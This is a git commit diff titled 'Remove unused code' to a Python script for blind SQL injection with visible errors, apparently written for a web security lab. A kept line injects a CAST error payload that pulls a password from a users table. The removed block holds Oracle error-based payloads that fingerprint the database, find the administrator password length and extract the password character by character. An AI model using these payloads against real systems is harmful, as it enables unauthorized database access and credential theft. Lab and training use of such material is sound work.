b4b454b58bf3034636e5335e93f66703c3b0e7ae
Vincenzo Minolfi <vincenzo.minolfi@gmail.com>
2026-08-22 09:15:35 +0200

    Remove unused code

--- blind_sql_injection_with_visible_errors.py
+++ blind_sql_injection_with_visible_errors.py
@@ -93,64 +93,6 @@ async def main():
     raw_req_17 = RAW_REQUEST_1.replace("@@@PAYLOAD@@@", "' AND 1=CAST((SELECT password FROM users limit 1) AS int)--")
     print('FINAL ATTACK - PASSWORD:', end='')
     await print_net_result(raw_req_17, True)
-
-    return
-
-    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "''")
-    print('WITHOUT ERROR (but with db check) CALL:', end='')
-    await print_net_result(raw_req_5)
-
-    raw_req_4a = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '')||'""")
-    print('WITHOUT ERROR (if sql) CALL:', end='')
-    await print_net_result(raw_req_4a)
-    
-    raw_req_4b = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' from dual)||'""")
-    print('WITHOUT ERROR (if oracle) CALL:', end='')
-    await print_net_result(raw_req_4b)
-
-    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' FROM not_a_real_table)||'""")
-    print('Oracle fake table:', end='')
-    await print_net_result(raw_req_5)
-
-    # WHERE ROWNUM=1 is important because more than one results would break the concatenation!
-    raw_req_6 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' FROM users WHERE ROWNUM = 1)||'""")
-    print('Oracle table "users":', end='')
-    await print_net_result(raw_req_6)
-
-    raw_req_7 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""")
-    print('Oracle error test:', end='')
-    await print_net_result(raw_req_7)
-
-    raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""")
-    print('Oracle non-error test:', end='')
-    await print_net_result(raw_req_8)
-
-    raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'""")
-    print('Oracle administrator test:', end='')
-    await print_net_result(raw_req_9)
-
-    # We could use "greather than" instead of "equals" and use binary search for the length, but I kept it simple!
-    pwd_len = None
-    for i in range(1, 40):
-        payload = """'||(SELECT CASE WHEN LENGTH(password)<>@@@LEN@@@ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'""".replace("@@@LEN@@@", str(i))
-        raw_req_10 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
-        print(f'Oracle administrator password length {i}:', end='')
-        if await print_net_result(raw_req_10):
-            pwd_len = i
-            break
-
-    import string
-    pwd = ''
-    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
-    for i in range(1, pwd_len+1):
-        for c in charset:
-            payload = f"""'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"""
-            raw_req_14 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
-            print(f'Oracle administrator password {c} in position {i+1}:', end='')
-            if await print_net_result(raw_req_14):
-                pwd += c
-                print(f'Password so far: {pwd}')
-                break
     
 
 if __name__ == "__main__":
